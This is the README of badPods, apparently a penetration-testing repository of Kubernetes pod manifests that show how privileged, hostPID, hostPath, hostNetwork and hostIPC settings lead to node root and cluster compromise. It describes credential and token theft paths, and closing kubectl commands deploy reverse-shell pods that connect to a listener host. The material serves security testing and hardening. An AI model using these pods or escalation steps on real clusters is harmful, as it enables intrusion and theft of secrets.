# badPods

A collection of yamls that create pods with different elevated privileges. Quickly demonstrate the impact of allowing specific security sensitive pod specifications. The focus here is attacks that require the creation of pods. 

## Background
Occasionally pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications using Pod Security Policies or with admission controllers like OPA Gatekeeper. However, the real-world security implication of allowing a certain attributes is not always understood, and quite often, pod creation polices are not as locked down as they should be. 

## Prerequisites
In order to be successful in this attack path, you'll need the following: 

1. Access to a cluster 
1. Permission to create pods in at least one namespace. If you can exec into them that makes life easier.  
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all


## Pods you can exec into

Notes | yaml | readme
-- | -- | --
Nothing allowed | [yaml](yaml/nothing-allowed/pod-nothing-allowed.yaml) | [readme](yaml/nothing-allowed/README.md)
Everything allowed | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [readme](yaml/everything-allowed/README.md)
Privileged and hostPid | [yaml](yaml/priv-and-hostpid/README.md) | [readme](yaml/priv-and-hostpid/README.md)
Privileged only | [yaml](yaml/priv-only/pod-priv-only.yaml) | [readme](yaml/priv-only/README.md)
hostPid only | [yaml](yaml/hostpid-only/pod-hostpid-only.yaml) | [readme](yaml/hostpid-only/README.md)
hostNetwork only | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only.yaml) | [readme](yaml/hostnetwork-only/README.md)
hostIPC only | [yaml](yaml/hostipc-only/pod-hostipc-only.yaml) | [readme](yaml/hostipc-only/README.md)

## Reverse shell versions of each pod

Notes | yaml | readme
-- | -- | --
Everything allowed | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml) |  [readme](yaml/everything-allowed/README.md)
Nothing allowed |  [yaml](yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml) | [readme](yaml/nothing-allowed/README.md)
Privileged and hostPid | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml) | [readme](yaml/priv-and-hostpid/README.md)
Privileged only | [yaml](yaml/priv-only/pod-priv-only-revshell.yaml) | [readme](yaml/priv-only/README.md)
hostPid only | [yaml](yaml/hostipc-only/pod-hostipc-only-revshell.yaml) | [readme](yaml/hostpid-only/README.md)
hostNetwork only | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml) | [readme](yaml/hostnetwork-only/README.md)
hostIPC only | [yaml](yaml/hostipc-only/README.md) | [readme](yaml/hostipc-only/README.md)

 

# Impact - What's the worst that can happen?

## Nothing allowed

### What's the worst that can happen?
Multiple potential paths to full cluster compromise (all resources in all namespaces)

### How?
There are plenty of attack paths that are available even if you can only without any security specific specifications like hostPID or privileged enabled. I'll just list some of the most common ones here:
* **Cloud metadata** - If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both. 
* **Overly permissive service account** - If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
* **Anonymous-auth** - If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
* **Traditional vulnerability hunting** -Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the host you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 

### Usage and exploitation examples 
[yaml/nothing-allowed/README.md](yaml/nothing-allowed/README.md) 

References: 
* https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/


So, with some of those privesc paths out of the way, **for the next examples let's assume we are talking about additional escalation paths** that are specific to the enabled specifications.


## Everything allowed

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
The pod you create mounts the host's filesystem to the pod. You then exec your pod and chroot to the directory where you mounted the host's filesystem and have root on the node running your pod. One promising privesc path is available if you can schedule your pod to run on the master node (not possible in most cloud hosted k8s environment). Even if you can only schedule your pod on the worker node, you can access the node's kubelet creds, you can create mirror pods in any namespace, and you can access any secret mounted within any pod on the node you are on, and then use it to gain access to other namespaces or to create new cluster role bindings. 

### Usage and exploitation examples 
[yaml/everything-allowed/README.md](yaml/everything-allowed/README.md) 

Reference:
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
 
## HostPID and Privileged

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
In this scenario, the only thing that changes is now you gain root access to the host. Rather than chrooting to the host's filesystem first, you can use nsenter to run bash in the host's PID 1 namespace, giving you a root shell on the node running your pod. Once you are root on the host, the privesc paths are all the same as described above. 

### Usage and exploitation examples 
[yaml/priv-and-hostpid/README.md](yaml/priv-and-hostpid/README.md) 


References: 
* https://twitter.com/mauilion/status/1129468485480751104
* https://github.com/kvaps/kubectl-node-shell

## Privileged only

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
While can eventually get an interactive shell on the node like in the cases above, you start with non-interactive command execution and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above.

### Usage and exploitation examples 
[yaml/priv-only/README.md](yaml/priv-only/README.md) 

References: 
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/


## hostPath only

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
While you don't have access to host process or network namespaces, having access to the full filesystem allows you to perform most of the same types of privesc paths outlined above. Hunt for tokens from other pods running on the node and hope you find a token associated with a highly privileged service account.

### Usage and exploitation examples 
[yaml/hostpath-only/README.md](yaml/hostpath-only/README.md)


## hostPid only

### What's the worst that can happen?
Unlikely but possible path to cluster compromise 

### How?
You can run `ps -aux` on the host. Look for any process that includes passwords, tokens, or keys, and use them to privesc within the cluster, to services supported by the cluster, or to services that cluster hosted applications are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin.   You can also kill any process on the node (DOS).  

### Usage and exploitation examples 
[yaml/hostpid-only/README.md](yaml/hostpid-only/README.md)


## hostNetwork only

### What's the worst that can happen?
Potential path to cluster compromise 

### How?
Sniff unencrypted traffic on any interface on the host and potentially find service account tokens or other sensitive information that is transmitted over unencrypted channels. <br> You can also reach services that only listen on the host's loopback interface or are otherwise blocked by nework polices. These services might turn into a fruitful privesc path. 

### Usage and exploitation examples 
[yaml/hostnetwork-only/README.md](yaml/hostnetwork-only/README.md) 




## hostIPC only

### What's the worst that can happen?
Not seen often - but potential limited compromise 

### How?
If any process on the host, or any processes within a pod is using the host's interprocess communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware. 

### More details and exploitation examples 
[yaml/hostipc-only/README.md](yaml/hostipc-only/README.md) 


**Caveat:** There are many kubernetes specific security controls available to administrators that can reduce the impact of pods created with the following privileges. As is always the case with penetration testing, your milage may vary.



## Usage
 Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  

### Clone the repo
```bash
git clone https://github.com/BishopFox/badPods
cd badPods
```

### Create the pods 

```bash
# Create all pods (or at least try to create them)
kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
kubectl apply -f ./yaml/hostpath-only/pod-hostpath-only.yaml
kubectl apply -f ./yaml/hostpid-only/pod-hostpid-only.yaml 
kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
```

### Reverse Shell version of each pod
If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:

```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath-only/pod-hostpath-only-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
```

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes security. 
